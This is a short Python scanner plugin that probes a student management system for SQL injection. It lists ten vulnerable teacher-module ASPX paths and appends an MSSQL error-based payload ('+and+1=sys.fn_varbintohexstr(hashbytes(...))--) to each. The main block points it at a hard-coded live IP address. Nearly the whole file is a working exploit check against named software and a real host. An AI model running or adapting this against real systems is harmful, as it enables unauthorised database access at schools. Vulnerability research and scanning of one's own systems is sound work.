#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:学生综合管理系统10处高危SQL注入漏洞打包3
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0108502/
#Author:xq17

def assign(service, arg):
    if service == 'anmai':
        return True, arg

def audit(arg):
    urls = [
        
    "teacher/teachingtechnology/patentinfoEdit.aspx?id=1",
    "teacher/teachingtechnology/teachingcoursewareEdit.aspx?id=1",
    "teacher/teachingtechnology/wonderfulcoursewareEdit.aspx?id=1",
    "teacher/teachingtechnology/ColligationSelect/TeachingExperience_P.aspx?id=1",
    "teacher/teachingtechnology/ColligationSelect/TeachingPlan_P.aspx?id=1",
    "teacher/teachingtechnology/ColligationSelect/TeachingPractise_P.aspx?id=1",
    "teacher/teachingtechnology/ColligationSelect/TeachingReflect_P.aspx?id=1",
    "teacher/teachingtechnology/ColligationSelect/TeachingSum_up_P.aspx?id=1",
    "teacher/teachingtechnology/ColligationSelect/wonderfulcourseware_P.aspx?id=1",
    "teacher/teachingtechnology/Course_Record_P.aspx?id=1"
    ]

    data = "'+and+1=sys.fn_varbintohexstr(hashbytes('MD5','1234'))--"
    for url in urls:
        vul = arg + url + data
        code, head, res, errcode, _ = curl.curl2(vul)
        if code!=0 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
            security_hole(arg + url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('anmai','http://218.22.96.74:8899/')[1])